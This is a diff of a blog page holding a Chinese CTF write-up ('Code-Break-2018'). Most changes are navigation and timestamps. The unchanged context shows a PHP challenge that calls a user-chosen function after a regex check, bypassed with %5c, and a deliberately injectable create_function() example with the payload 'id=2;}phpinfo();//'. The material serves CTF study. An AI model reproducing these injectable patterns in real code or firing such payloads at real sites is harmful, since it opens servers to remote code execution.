@@ -111,13 +111,15 @@
 <meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/8.png">
 <meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/6.png">
 <meta property="og:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/7.png">
-<meta property="og:updated_time" content="2018-12-31T12:43:13.317Z">
+<meta property="og:updated_time" content="2019-05-08T15:25:59.336Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Code-Break-2018">
 <meta name="twitter:description" content="前言年底了，来一发 Code-Break 入入魂。给无滋无味的预习增添一些色彩 膜了几位师傅的思路  let‘s go~！">
 <meta name="twitter:image" content="https://zo1ro.github.io/2018/12/30/code-break/code-break/4.png">
 
 
+
+  <link rel="alternate" href="/atom.xml" title="一个向往acm的ctf_dog" type="application/atom+xml">
 
 
 
@@ -230,6 +232,57 @@
     
 
     <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
 
   </li>
         
@@ -358,7 +411,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-12-31 20:43:13" itemprop="dateModified" datetime="2018-12-31T20:43:13+08:00">2018-12-31</time>
+                <time title="Modified: 2019-05-08 23:25:59" itemprop="dateModified" datetime="2019-05-08T23:25:59+08:00">2019-05-08</time>
               
             
           </span>
@@ -398,7 +451,7 @@
 <h2 id="0x1-easy-function"><a href="#0x1-easy-function" class="headerlink" title="0x1 easy_function"></a>0x1 easy_function</h2><p>源码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&apos;action&apos;] ?? &apos;&apos;;</span><br><span class="line">$arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&apos;&apos;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这题的思路在于不影响函数调用的情况下绕过正则，fuzz出 <code>%5c</code> 在字符前仍能进行调用，通过<code>$arg</code> 传入 <code>payload</code> </p>
-<p><img src="code-break\4.png" alt="4"></p>
+<p><img src="code-break/4.png" alt="4"></p>
 <p>参考</p>
 <p><a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?id=2;&#125;phpinfo();/*</span></span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$str2=<span class="string">'echo  '</span>.$a.<span class="string">'test'</span>.$id.<span class="string">";"</span>;</span><br><span class="line">$f1 = create_function(<span class="string">'$a'</span>,$str2);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">payload</span></span><br><span class="line"><span class="comment">id=2;&#125;phpinfo();//</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">源代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>.$a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注入后代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"test"</span>;&#125;</span><br><span class="line">  phpinfo();<span class="comment">//;//此处为注入代码。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -607,6 +660,13 @@
             </nav>
           
 
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
           
 
           
